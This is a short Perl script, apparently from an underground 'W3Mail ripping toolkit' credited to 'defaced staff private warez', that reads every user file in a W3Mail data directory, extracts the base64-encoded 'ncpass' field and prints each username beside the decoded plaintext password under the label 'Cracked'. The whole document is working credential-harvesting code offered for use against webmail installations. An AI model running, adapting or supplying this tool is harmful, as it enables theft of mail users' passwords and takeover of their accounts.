#!/usr/bin/perl

#     defaced staff private warez
#    W3Mail ripping toolkit v 1.0.9_full
#      < w3mail-decrypt.pl - password decryptor >
#
#  this tool decrypts passwordz from W3mail's datebase
#

if ($#ARGV < 0)
{
  print "\tw3mail-decrypt v 1.02\n";
  print "usage: $0 <datadir>\n\n";
  exit;
}

$datadir = $ARGV[0];

print "   Username   Password\n";
print "-" x 30;
print "\n\n";

chdir($datadir);
$list = `ls`;
@users = split(/\x0a/,$list);


foreach $usr (@users){

  open(TM,"<$usr");
  @conf = <TM>;
  close(TM);

  foreach $str (@conf){
    if ($str =~ m/ncpass/){

      ($a,$b,$c) = split(/\x22/,$str);
      $pwd = decode_base64($b);
      print "Cracked:  $usr\t\t $pwd\n";
      break;
    }
  }

}

print "press any key\n";
$a = <>;

sub decode_base64 ($)
{
    local($^W) = 0; # unpack("u",...) gives bogus warning in 5.00[123]

    my $str = shift;
    $str =~ tr|A-Za-z0-9+=/||cd;        # remove non-base64 chars
    if (length($str) % 4) {
      print("error: bad base64 hash!\n");
    }
    $str =~ s/=+$//;                # remove padding
    $str =~ tr|A-Za-z0-9+/| -_|;        # convert to uuencoded format

    return join'', map( unpack("u", chr(32 + length($_)*3/4) . $_),
            $str =~ /(.{1,60})/gs);
}
